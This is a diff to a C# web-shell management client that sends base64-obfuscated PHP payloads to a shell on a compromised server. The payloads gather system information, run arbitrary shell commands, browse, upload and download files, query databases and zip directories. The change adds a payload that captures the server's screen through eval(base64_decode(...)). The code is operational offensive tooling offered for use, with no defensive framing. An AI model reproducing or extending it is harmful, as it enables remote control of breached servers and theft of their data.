@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
 using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -18,7 +20,6 @@ namespace webshellManager
 
         //b64 encoded payload
         private const string BASICINFORMATION = "ZWNobyAiLcKkLSIuQHBocF91bmFtZShzKS4iLcKkLS3CpC0iLkBwaHBfdW5hbWUobikuIi3CpC0twqQtIi5AcGhwX3VuYW1lKHIpLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiItwqQtLcKkLSIuRElSRUNUT1JZX1NFUEFSQVRPUi4iLcKkLSI7";
-
         private const string INFORMATION = "ZWNobyAiLcKkLSIuQHBocF91bmFtZShzKS4iLcKkLS3CpC0iLkBwaHBfdW5hbWUobikuIi3CpC0twqQtIi5AcGhwX3VuYW1lKHIpLiItwqQtLcKkLSIuQHBocF91bmFtZSh2KS4iLcKkLS3CpC0iLkBwaHBfdW5hbWUobSkuIi3CpC0twqQtIi4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iLcKkLS3CpC0iLiRfU0VSVkVSWydTRVJWRVJfQUREUiddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1NFUlZFUl9QUk9UT0NPTCddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1JFUVVFU1RfVElNRSddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4iLcKkLS3CpC0iLiRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXS4iLcKkLS3CpC0iLiRfU0VSVkVSWydTRVJWRVJfQURNSU4nXS4iLcKkLS3CpC0iLnBocHZlcnNpb24oKS4iLcKkLSI7";
         private const string SHELL = "JGMgPSBiYXNlNjRfZGVjb2RlKCRfR0VUWyJjIl0pOyAkbCA9IGRpcm5hbWUoX19GSUxFX18pIC4gIi9zaGNtZC50eHQiOyBpZiAoUEhQX09TID09ICdXSU5OVCcgfHwgUEhQX09TID09ICdXSU4zMicgfHwgUEhQX09TID09ICdXaW5kb3dzJykgeyBzaGVsbF9leGVjKCRjIC4gIj4iIC4gJGwpOyAkbyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsKTsgaWYgKGZpbGVfZXhpc3RzKCRsKSkgdW5saW5rKCRsKTsgfSBlbHNlIHsgJG8gPSBzaGVsbF9leGVjKCRjKTsgfSBlY2hvICItwqQtIiAuICRvIC4gIi3CpC0iOw==";
         private const string BROWSE = "JGQ9bmV3IERpcmVjdG9yeUl0ZXJhdG9yKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2MnXSkpO2ZvcmVhY2goJGQgYXMgJGspe2lmKCRrLT5pc1JlYWRhYmxlKCk9PWZhbHNlIG9yICRrLT5pc0RvdCgpKWNvbnRpbnVlO2lmKCRrLT5nZXRUeXBlKCk9PSJkaXIiKSR2YXI9JiRmb2xkZXI7ZWxzZSAkdmFyPSYkZmlsZTskdmFyLj0iLWl0bS0twqQtIi51dGY4X2VuY29kZSgieyRrfSIpLiItwqQtLcKkLSIuJGstPmdldFNpemUoKS4iLcKkLS3CpC0iLkBzdWJzdHIoc3ByaW50ZignJW8nLCRrLT5nZXRQZXJtcygpKSwtNCkuIi3CpC0twqQtIi5kYXRlKCdtL2QvWSBoOm06cycsJGstPmdldE1UaW1lKCkpLiItwqQtLcKkLSIuQG1pbWVfY29udGVudF90eXBlKCRrLT5nZXRSZWFsUGF0aCgpKS4iLcKkLS1pdG0tIjt9ZWNobyAiLXB0aMKkLSIucmVhbHBhdGgoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSkuIi1wdGjCpC0iLiItZmlsZcKkLSIuJGZpbGUuIi1maWxlwqQtIi4iLWZvbGRlcsKkLSIuJGZvbGRlci4iLWZvbGRlcsKkLSI7";
@@ -28,10 +29,9 @@ namespace webshellManager
         private const string RENAME = "cmVuYW1lKGljb252KCJVVEYtOCIsIkNQMTI1MiIsYmFzZTY0X2RlY29kZSgkX0dFVFsiYyJdKSksaWNvbnYoIlVURi04IiwiQ1AxMjUyIixiYXNlNjRfZGVjb2RlKCRfR0VUWyJkIl0pKSk7";
         private const string UPLOAD = "ZmlsZV9wdXRfY29udGVudHMoaWNvbnYoIlVURi04IiwgIkNQMTI1MiIsIGJhc2U2NF9kZWNvZGUoJF9HRVRbImQiXSkpLCBmaWxlX2dldF9jb250ZW50cyhiYXNlNjRfZGVjb2RlKCRfR0VUWyJjIl0pKSk7";
         private const string DOWNLOAD = "ZWNobyAiLcKkLSIuYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cyhpY29udigiVVRGLTgiLCAiQ1AxMjUyIiwgYmFzZTY0X2RlY29kZSgkX0dFVFsiYyJdKSkpKS4iLcKkLSI7";
-
+        private const string SCREENSHOT = "JGltPWltYWdlZ3JhYnNjcmVlbigpO29iX3N0YXJ0KCk7aW1hZ2VwbmcoJGltKTskaW1hZ2VkYXRhPW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIi1pdG0tIi5iYXNlNjRfZW5jb2RlKCRpbWFnZWRhdGEpLiItaXRtLSI7";
         //b64 encoded x2
         private const string SQL = "SkdFOVlYSnlZWGtvS1Rza1lqMXRlWE54YkdsZlkyOXVibVZqZENoaVlYTmxOalJmWkdWamIyUmxLQ1JmUjBWVVd5SmpJbDBwTEdKaApjMlUyTkY5a1pXTnZaR1VvSkY5SFJWUmJJbVFpWFNrc1ltRnpaVFkwWDJSbFkyOWtaU2drWDBkRlZGc2laU0pkS1N4aVlYTmxOalJmClpHVmpiMlJsS0NSZlIwVlVXeUptSWwwcEtUc2taVDF0ZVhOeGJHbGZjWFZsY25rb0pHSXNZbUZ6WlRZMFgyUmxZMjlrWlNna1gwZEYKVkZzaVp5SmRLU2s3ZDJocGJHVW9KSEp2ZHowa1pTMCtabVYwWTJoZllYSnlZWGtvVFZsVFVVeEpYMEZUVTA5REtTbGhjbkpoZVY5dwpkWE5vS0NSaExDUnliM2NwTzJadmNtVmhZMmdvWVhKeVlYbGZhMlY1Y3lna1lWc3dYU2xoY3lBa2F5bGxZMmh2SUNjdFkyOXN3cVF0Ckp5NGtheTRuTFdOdmJNS2tMU2M3Wm05eVpXRmphQ2drWVNCaGN5QWtiR2x1WlNsN1pXTm9ieUFuTGNLa0xTYzdabTl5WldGamFDaGgKY25KaGVWOTJZV3gxWlhNb0pHeHBibVVwWVhNZ0pHbDBiU2xsWTJodklDY3RhWFJ0d3FRdEp5NGthWFJ0TGljdGFYUnR3cVF0Snp0bApZMmh2SUNjdHdxUXRKenQ5";
-
         private const string ZIP = "SkhBOWFXTnZibllvSWxWVVJpMDRJaXdpUTFBeE1qVXlJaXhpWVhObE5qUmZaR1ZqYjJSbEtDUmZSMFZVV3lKaklsMHBLVHNrY0hvOWFXTnZibllvSWxWVVJpMDRJaXdpUTFBeE1qVXlJaXhpWVhObE5qUmZaR1ZqYjJSbEtDUmZSMFZVV3lKaklsMHBLUzRpTGxwSlVDSTdKSG85Ym1WM0lGcHBjRUZ5WTJocGRtVTdhV1lvSkhvdFBtOXdaVzRvSkhCNkxGcHBjRUZ5WTJocGRtVTZPa05TUlVGVVJTazlQVDFVVWxWRktYdHBaaWhwYzE5a2FYSW9KSEFwS1hza1ptWTlibVYzSUZKbFkzVnljMmwyWlVsMFpYSmhkRzl5U1hSbGNtRjBiM0lvYm1WM0lGSmxZM1Z5YzJsMlpVUnBjbVZqZEc5eWVVbDBaWEpoZEc5eUtDUndLU3hTWldOMWNuTnBkbVZKZEdWeVlYUnZja2wwWlhKaGRHOXlPanBNUlVGV1JWTmZUMDVNV1NrN1ptOXlaV0ZqYUNna1ptWWdZWE1nSkc1aGJXVTlQaVJtS1h0cFppZ2hKR1l0UG1selJHbHlLQ2twZXlSbWNEMGtaaTArWjJWMFVtVmhiRkJoZEdnb0tUc2tjbkE5YzNWaWMzUnlLQ1JtY0N4emRISnNaVzRvSkhBcEt6RXBPeVI2TFQ1aFpHUkdhV3hsS0NSbWNDd2tjbkFwTzMxOWZXVnNjMlY3SkhvdFBtRmtaRVpwYkdVb0pIQXNZbUZ6Wlc1aGJXVW9KSEFwS1R0OUpIb3RQbU5zYjNObEtDazdmV1ZqYUc4Z0pIQjZPdz09";
 
         public Webshell(string address, string pVariable)
@@ -155,6 +155,17 @@ namespace webshellManager
             }
 
             return Tuple.Create(column, content);
+        }
+
+        public Bitmap takeScreenshot()
+        {
+            String result=client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + SCREENSHOT + "\"));");
+            MatchCollection matchedColumns = Regex.Matches(result, "-itm-(.*?)-itm-");
+            byte[] imageBytes = Convert.FromBase64String(matchedColumns[0].Groups[1].Value);
+            using (var ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
+            {
+                return (Bitmap)Image.FromStream(ms, true);
+            }
         }
 
         public void newDir(string path)
